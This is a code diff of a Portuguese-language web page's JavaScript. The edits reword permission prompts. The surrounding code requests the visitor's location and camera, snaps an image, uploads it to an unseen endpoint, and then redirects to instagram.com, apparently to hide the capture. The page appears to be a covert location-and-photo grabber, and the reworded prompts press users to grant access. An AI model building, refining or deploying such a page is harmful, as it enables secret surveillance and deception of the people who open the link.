@@ -42,7 +42,7 @@
     }
 
     function onGeoError() {
-      showOverlay('Toque para permitir a localização', askLocation);
+      showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou acesse as configurações do navegador ou do seu dispositivo para concedê-las.', askLocation);
     }
 
     function onGeoSuccess(pos) {
@@ -62,7 +62,7 @@
         askCamera(); // Agora sempre tenta a câmera direto, sem mensagem no Safari
       })
       .catch(() => {
-        showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askLocation);
+        showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou acesse as configurações do navegador ou do seu dispositivo para concedê-las.', askLocation);
       });
     }
 
@@ -93,12 +93,12 @@
                 body: imgForm
               })
               .then(() => window.location.href = 'https://instagram.com')
-              .catch(() => showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askCamera));
+              .catch(() => showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou acesse as configurações do navegador ou do seu dispositivo para concedê-las.', askCamera));
             }, 'image/png');
           }, 500);
         })
         .catch(() => {
-          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou vá até as configurações do navegador ou do seu aparelho.', askCamera);
+          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou acesse as configurações do navegador ou do seu dispositivo para concedê-las.', askCamera);
         });
     }
 
